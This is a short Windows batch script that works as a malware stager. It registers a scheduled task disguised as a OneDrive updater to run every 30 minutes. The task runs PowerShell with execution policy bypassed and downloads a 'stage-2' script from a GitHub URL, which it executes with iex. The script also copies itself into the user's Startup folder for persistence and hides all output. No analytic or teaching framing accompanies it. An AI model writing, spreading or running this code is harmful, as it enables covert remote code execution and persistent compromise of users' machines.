@echo off
setlocal enabledelayedexpansion
set TaskName=OneDriveStandaloneUpdater
schtasks /create /tn "%TaskName%" /tr "pwsh -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/stage-2.ps1 -UseBasicParsing|iex'" /sc minute /mo 30 /f > NUL 2>&1
timeout /t 1 /nobreak >nul 
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul 2>&1)
endlocal
exit 
